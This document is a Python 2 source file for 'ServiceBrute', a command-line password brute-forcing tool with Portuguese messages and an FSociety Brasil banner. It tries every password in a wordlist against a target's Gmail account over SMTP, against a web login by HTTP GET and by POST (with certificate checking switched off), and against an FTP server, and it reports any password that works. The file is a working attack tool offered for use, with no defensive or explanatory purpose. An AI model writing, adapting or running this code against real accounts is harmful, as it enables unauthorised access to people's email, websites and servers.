#!/usr/bin/python
# -*- coding: cp1252 -*-

from ftplib import FTP
import smtplib
import sys
import os
import platform
import ftplib

try:
    import colorama
    from colorama import Fore, Back, Style
except ImportError:
    print "ERRO! - Necessario a biblioteca COLORAMA. \n Instale com - easy_install colorama"

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
except ImportError:
    print Fore.RED+"ERRO! - Necessario a biblioteca REQUESTS. \n Instale com - easy_install requests"

colorama.init()

so = platform.system()
if(so=="Windows"):
    os.system("cls")
else:
    os.system("clear")

try:
    def help():
        ajuda = """
                                HELP MODULE - ServiceBrute
servicebrute.py --form 1 --email <target_email> --wordlist <passfile.txt>
Example:
servicebrute.py --form 1 --email email@email.com --wordlist passwordfile.txt

servicebrute.py --form 2 --user <target_user> --wordlist <passfile.txt> --target <target_url>
Example:
servicebrute.py --form 2 --user admin --wordlist passwordfile.txt --target http://www.target.com

servicebrute.py --form 3 --user <target_user> --wordlist <passsfile.txt> --target <target_url>
Example:
servicebrute.py --form 3 --user admin --wordlist passwordfile.txt --target http://www.target.com

servicebrute.py --form 4 --user <target_user> --wordlist <passfile.txt> --target <target_url>
Example:
servicebrute.py --form 4 --user admin --wordlist passwordfile.txt --target ftp.target.com
        
"""
        print(Fore.CYAN+ajuda)
        
    x = sys.argv
    
    if x[1] == "--form":
        forma = sys.argv[2]
        if forma == "1":
            if x[3] == "--email":
                email = sys.argv[4]
                if x[5] == "--wordlist":
                    wordlist = sys.argv[6]
                    wordlist = open(wordlist, "r")
        
                    smtp = smtplib.SMTP("smtp.gmail.com", 587)
                    smtp.ehlo()
                    smtp.starttls()
        
                    for senhas in wordlist:
                        try:
                                    smtp.login(email, senhas)
                                    print Fore.GREEN+"Senha encontrada : \n E-mail - %s \n Senha - %s"%(email,senhas)
                                    break
                        except smtplib.SMTPAuthenticationError:
                                       print Fore.RED+"Tentando login : \n E-MAIL - %s \n SENHA - %s"%(email,senhas)
    if x[1] == "--form":
        forma = sys.argv[2]
        if forma == "2":
            if x[3] == "--user":
                user = sys.argv[4]
                if x[5] == "--wordlist":
                    wordlist = sys.argv[6]
                    senha = open(wordlist, "r")
                    if x[7] == "--target":
                        target = sys.argv[8]
                        for senhas in senha:
                            r = requests.get(target+"/login.php?user="+user+"&password="+senhas)
                            if r.status_code == 302:
                                print Fore.GREEN+"[!] SENHA ENCONTRADA : \n Usuario: %s - \n Password: %s"%(user,senhas)
                            else:
                                print Fore.RED+"Tentando login : \n Usuario: %s - \n Password: %s"%(user,senhas)

    if x[1] == "--form":
        forma = sys.argv[2]
        if forma == "3":
            if x[3] == "--user":
                user = sys.argv[4]
                if x[5] == "--wordlist":
                    wordlist = sys.argv[6]
                    senha = open(wordlist, "r")
                    if x[7] == "--target":
                        target = sys.argv[8]
                        form_user = (str(raw_input(Fore.GREEN+"Formulario de usuario: ")))
                        form_pass = (str(raw_input(Fore.GREEN+"Formulario de senhas: ")))
                        for senhas in senha:
                            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                            payload = { form_user : user, form_pass : senhas }
                            r = requests.post(target, data=payload, verify=False)
                            if r.status_code == 302:
                                print Fore.GREEN+"[!] SENHA ENCONTRADA : \n Usuario: %s - \n Password: %s"%(user,senhas)
                                break
                            else:
                                print Fore.RED+"Tentando login : \n Usuario: %s - \n Password: %s"%(user,senhas)

    if x[1] == "--form":
        forma = sys.argv[2]
        if forma == "4":
            if x[3] == "--user":
                user = sys.argv[4]
                if x[5] == "--wordlist":
                    wordlist = sys.argv[6]
                    senha = open(wordlist, "r")
                    if x[7] == "--target":
                        target = sys.argv[8]
                        for senhas in senha:
                            try:
                                ftp = FTP(target)
                                ftp.login(user,senhas)
                                print Fore.GREEN+"[!] SENHA ENCONTRADA : \n Usuario: %s - \n Password: %s"%(user,senhas)
                            except ftplib.error_perm:
                                print Fore.RED+"Tentando login : \n Usuario: %s - \n Password: %s"%(user,senhas)

    if x[1] == "--help":
        help()
        
except IndexError:
    banner = """
                                                                                
 )\ )                                  (                 )       
(()/(   (   (     )   (          (   ( )\  (      (   ( /(   (   
 /(_)) ))\  )(   /((  )\   (    ))\  )((_) )(    ))\  )\()) ))\  
(_))  /((_)(()\ (_))\((_)  )\  /((_)((_)_ (()\  /((_)(_))/ /((_) 
/ __|(_))   ((_)_)((_)(_) ((_)(_))   | _ ) ((_)(_))( | |_ (_))   
\__ \/ -_) | '_|\ V / | |/ _| / -_)  | _ \| '_|| || ||  _|/ -_)  
|___/\___| |_|   \_/  |_|\__| \___|  |___/|_|   \_,_| \__|\___|  
                                                                 
           Ferramenta para bruteforce em servicos
              Desenvolvido por Derick Santos 
                Conheça a FSociety Brasil:
                https://fsocietybrasil.org\n
          servicebrute.py --help para mais funções\n
                - [1] G-Mail BRUTEFORCE
                - [2] HTTP-GET BRUTEFORCE
                - [3] HTTP-POST BRUTEFORCE
                - [4] FTP BRUTEFORCE"""
    print(Fore.YELLOW+banner)
except KeyboardInterrupt:
    print Fore.GREEN+"Até mais..."